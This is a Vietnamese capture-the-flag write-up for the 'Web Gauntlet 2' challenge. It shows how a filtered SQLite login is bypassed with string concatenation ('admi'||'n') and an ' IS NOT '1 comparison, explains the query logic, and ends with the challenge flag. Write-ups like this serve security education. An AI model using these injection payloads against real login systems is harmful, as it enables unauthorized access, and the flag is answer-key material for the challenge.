# Web Gauntlet 2

![image.png](Web%20Gauntlet%202/image.png)

Tiếp tục bài số 2 trong bộ Web Gauntlet 2, bài này thì tiếp tục mình sẽ nhận được 2 link 

![image.png](Web%20Gauntlet%202/image%201.png)

Tiếp tục vẫn là yêu cầu mình đăng nhập bằng admin

![image.png](Web%20Gauntlet%202/image%202.png)

Tuy nhiên thì lần này bộ lọc đã khắt khe hơn rất nhiều rồi 

Đầu tiên ở đây thì chúng ta sẽ cần username admin nhưng mà do nó đang bị chặn nên mình sẽ sử dụng phép nối chuỗi

```sql
admi'||'n
```

Tiếp là mọi người thấy vì các dấu `comment` đã bị chặn rồi nên chúng ta sẽ phải dùng phép so sánh logic để vượt qua bộ lọc, mặc dù nó đã lọc các toán tử `=,or` tuy nhiên vẫn còn 1 số lựa chọn thay thế là `IS` và `IS NOT`

`IS`: dùng để so sánh bằng (=)

```sql
username IS 'admin'
```

`IS NOT`: dùng để so sánh khác (≠)

```sql
password IS NOT '1'
```

Vì vậy ở đây mình sẽ tiến hành nhập 

`username`

```sql
admi'||'n
```

`password`

```sql
' IS NOT '1
```

Câu truy vấn trở thành 

```sql
SELECT username, password FROM users WHERE username='admi'||'n' AND password='' IS NOT '1'
```

**Giải thích luồng chạy của SQLite:**

1. Nó thấy toán tử `=` và `IS NOT` có cùng độ ưu tiên, nên tính từ trái qua phải.
2. Nó tính `password=''` -> Sai (trả về `0`).
3. Nó lấy kết quả đó tính tiếp: `0 IS NOT '1'` -> Đúng (trả về `1` / True).
4. Kết quả: Username đúng `AND` Password đúng -> Đăng nhập thành công.

![image.png](Web%20Gauntlet%202/image%203.png)

Mình sẽ qua `filter.php` để lấy flag

![image.png](Web%20Gauntlet%202/image%204.png)

academy{0n3_m0r3_t1m3_38c285e0}